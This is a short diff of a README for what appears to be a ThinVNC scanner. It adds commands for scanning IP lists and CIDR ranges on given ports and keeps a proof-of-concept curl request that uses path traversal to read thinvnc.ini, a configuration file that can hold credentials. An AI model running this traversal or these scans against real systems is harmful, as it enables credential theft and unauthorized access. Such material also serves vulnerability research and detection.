@@ -8,7 +8,16 @@
 ```
 "ThinVNC"
 ```
-	  
+or
+```
+python scanner.py file_list_ip_cidr 80 -o results.txt
+```
+```
+python scanner.py file_list_ip_cidr 80, 8080-8090 -o results.txt
+```
+```
+python scanner.py 192.168.1.0/24 80,8080-8090 -o results.txt
+```
 - POC:
 ```
 curl -k -X 'GET' "http://target_ip_address:port/a/\../\../thinvnc.ini"
